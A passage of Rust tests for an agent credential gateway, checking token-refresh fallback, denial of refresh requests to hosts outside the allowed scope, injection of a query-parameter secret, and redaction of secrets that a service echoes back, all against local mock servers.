    let _ = (data_h, refresh_h);
}

#[test]
#[serial_test::serial]
fn test_credential_request_refresh_rejected_falls_back_to_original_401() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "stale-token");
    vault_add_secret(&_vault_temp, "GITHUB_REFRESH", "dead-refresh");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    // Data server: one 401, then done. Refresh server: 400 rejection.
    let (data_url, _) = spawn_one_shot_http_server("401 Unauthorized", "text/plain", "expired".to_string());
    let (reject_url, _) = spawn_one_shot_http_server("400 Bad Request", "application/json", r#"{"error":"invalid_grant"}"#.to_string());
    let host = url::Url::parse(&data_url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();
    store
        .upsert_credential(&refresh_credential(host, reject_url))
        .unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_refresh_001",
                "url": format!("{}/data", data_url)
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    // try_auto_refresh errors -> the original 401 response is what the agent sees.
    assert_eq!(parsed["ok"], true);
    assert_eq!(parsed["status"], 401);
}

#[test]
#[serial_test::serial]
fn test_credential_refresh_endpoint_out_of_scope_is_denied() {
    // The refresh endpoint host is NOT in allowed_hosts: the gateway must
    // not send the refresh token there. The fixture runs on 127.0.0.2 —
    // reachable (so without the binding the refresh would succeed and the
    // retry would 200), making the assertion discriminate between
    // binding-denial and a mere connection failure.
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string(), "127.0.0.2".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "stale-token");
    vault_add_secret(&_vault_temp, "GITHUB_REFRESH", "refresh-tok-abc");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let data_listener = TcpListener::bind("127.0.0.1:0").expect("bind data");
    let data_addr = data_listener.local_addr().unwrap();
    let data_requests: std::sync::Arc<std::sync::Mutex<usize>> =
        std::sync::Arc::new(std::sync::Mutex::new(0));
    let dr = data_requests.clone();
    let data_handle = thread::spawn(move || {
        for _ in 0..2 {
            let Ok((mut stream, _)) = data_listener.accept() else {
                return;
            };
            *dr.lock().unwrap() += 1;
            let mut request_buf = [0_u8; 2048];
            let _ = stream.read(&mut request_buf);
            let body = "expired";
            let response = format!(
                "HTTP/1.1 401 Unauthorized\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            let _ = stream.write_all(response.as_bytes());
        }
    });

    let refresh_listener = TcpListener::bind("127.0.0.2:0").expect("bind refresh");
    let refresh_addr = refresh_listener.local_addr().unwrap();
    let refresh_hits: std::sync::Arc<std::sync::Mutex<usize>> =
        std::sync::Arc::new(std::sync::Mutex::new(0));
    let rh = refresh_hits.clone();
    let refresh_handle = thread::spawn(move || {
        for _ in 0..2 {
            let Ok((mut stream, _)) = refresh_listener.accept() else {
                return;
            };
            *rh.lock().unwrap() += 1;
            let mut request_buf = [0_u8; 2048];
            let _ = stream.read(&mut request_buf);
            let body = r#"{"access_token":"fresh-token-42"}"#;
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            let _ = stream.write_all(response.as_bytes());
        }
    });

    // Data host allowed; the refresh endpoint on 127.0.0.2 is NOT.
    let mut cred = refresh_credential(
        "127.0.0.1".to_string(),
        format!("http://{refresh_addr}/refresh"),
    );
    cred.allowed_hosts = vec!["127.0.0.1".to_string()];
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_refresh_001",
                "url": format!("http://{data_addr}/data")
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["status"], 401, "no refresh retry may happen: {parsed}");
    assert_eq!(
        *refresh_hits.lock().unwrap(),
        0,
        "the refresh endpoint must never receive the token"
    );
    assert_eq!(*data_requests.lock().unwrap(), 1, "no retry after denial");

    // No joins: the servers are intentionally left waiting for the
    // connections that the binding forbids (their threads die with the
    // listener going out of scope at test end).
    let _ = (data_handle, refresh_handle);
}

/// A credential whose secret injects as `inject_as` on `host`.
fn query_credential(host: String, inject_as: &str) -> CredentialRecord {
    CredentialRecord {
        credential_id: "cred_query_001".to_string(),
        service: "openweathermap".to_string(),
        secret_name: "OWM_APPID".to_string(),
        inject_as: Some(inject_as.to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec![host],
        refresh_token_secret_name: None,
        refresh_url: None,
        refresh_method: None,
        refresh_headers: None,
        refresh_extract_access_token: None,
        refresh_extract_refresh_token: None,
        refresh_extract_expires_in: None,
        label: None,
    }
}

/// One-shot server that CAPTURES the request line and answers with `body`.
fn spawn_capturing_server(
    body: String,
) -> (String, Arc<std::sync::Mutex<String>>, thread::JoinHandle<()>) {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let addr = listener
        .local_addr()
        .expect("listener should expose local addr");
    let captured: Arc<std::sync::Mutex<String>> = Arc::new(std::sync::Mutex::new(String::new()));
    let captured_clone = captured.clone();
    let handle = thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            let mut request_buf = [0_u8; 4096];
            let _ = stream.read(&mut request_buf);
            let request = String::from_utf8_lossy(&request_buf).to_string();
            let request_line = request.lines().next().unwrap_or("").to_string();
            *captured_clone.lock().unwrap() = request_line;
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            let _ = stream.write_all(response.as_bytes());
            let _ = stream.flush();
        }
    });
    (format!("http://{}", addr), captured, handle)
}

/// One-shot server that CAPTURES the request line and answers with a JSON
/// body echoing that request line back — the "service reflects your URL"
/// shape that error payloads commonly take.
fn spawn_echoing_server() -> (String, Arc<std::sync::Mutex<String>>, thread::JoinHandle<()>) {
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let addr = listener
        .local_addr()
        .expect("listener should expose local addr");
    let captured: Arc<std::sync::Mutex<String>> = Arc::new(std::sync::Mutex::new(String::new()));
    let captured_clone = captured.clone();
    let handle = thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            let mut request_buf = [0_u8; 4096];
            let _ = stream.read(&mut request_buf);
            let request = String::from_utf8_lossy(&request_buf).to_string();
            let request_line = request.lines().next().unwrap_or("").to_string();
            *captured_clone.lock().unwrap() = request_line.clone();
            let body = format!("{{\"echo\":\"{request_line}\"}}");
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            let _ = stream.write_all(response.as_bytes());
            let _ = stream.flush();
        }
    });
    (format!("http://{}", addr), captured, handle)
}

#[test]
#[serial_test::serial]
fn test_credential_request_query_param_injection_arrives_at_service() {
    // #1107: OpenWeatherMap-style services authenticate via query parameter.
    // The gateway must append ?appid=<secret> itself — the agent never sees
    // or handles the secret — and the response must redact it.
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["openweathermap".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("OWM_APPID", "owm-secret-123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (data_url, captured, data_h) = spawn_capturing_server(r#"{"weather":"sunny"}"#.to_string());
    let host = url::Url::parse(&data_url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();

    let cred = query_credential(host, "query:appid");
    store.upsert_credential(&cred).unwrap();

    // The agent's URL carries a placeholder appid — the gateway must REPLACE
    // it, not append a second value (servers read the first occurrence).
    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_query_001",
                "url": format!("{}/data/2.5/weather?q=toulouse&appid=PLACEHOLDER", data_url)
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true, "{parsed}");
    assert_eq!(parsed["status"], 200, "{parsed}");
    assert_eq!(
        parsed["body"]["weather"], "sunny",
        "service response must pass through: {parsed}"
    );

    let request_line = captured.lock().unwrap().clone();
    assert!(
        !request_line.contains("appid=PLACEHOLDER"),
        "the placeholder must be replaced, not kept: {request_line}"
    );
    assert!(
        request_line.matches("appid=").count() == 1
            && request_line.contains("appid=owm-secret-123"),
        "exactly one appid param, carrying the secret: {request_line}"
    );
    assert!(
        request_line.contains("q=toulouse"),
        "unrelated params preserved: {request_line}"
    );

    let _ = data_h;
}

#[test]
#[serial_test::serial]
fn test_credential_request_query_param_secret_redacted_from_echo() {
    // Services (and their error payloads) echo the full request URL back.
    // The sanitizer must cover the percent-encoded param=secret pair, not
    // just the raw secret value (#1107).
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["openweathermap".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("OWM_APPID", "owm-secret-123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (data_url, captured, data_h) = spawn_echoing_server();
    let host = url::Url::parse(&data_url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();

    let cred = query_credential(host, "query:appid");
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential_request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_query_001",
                "url": format!("{}/echo", data_url)
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential_request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true, "{parsed}");

    // The request DID carry the secret…
    let request_line = captured.lock().unwrap().clone();
    assert!(request_line.contains("appid=owm-secret-123"), "{request_line}");

    // …and the service's echo of the request URL must come back sanitized:
    // the tool's own response contract, not just the log redactor.
    let body_str = parsed["body"]["echo"].as_str().unwrap_or_default();
    assert!(
        !body_str.contains("owm-secret-123"),
        "the raw secret must never survive in an echoed URL: {body_str}"
    );
    assert!(
        body_str.contains("appid=[REDACTED]"),
        "the param pair must be redacted by name: {body_str}"
    );

    let _ = data_h;
}
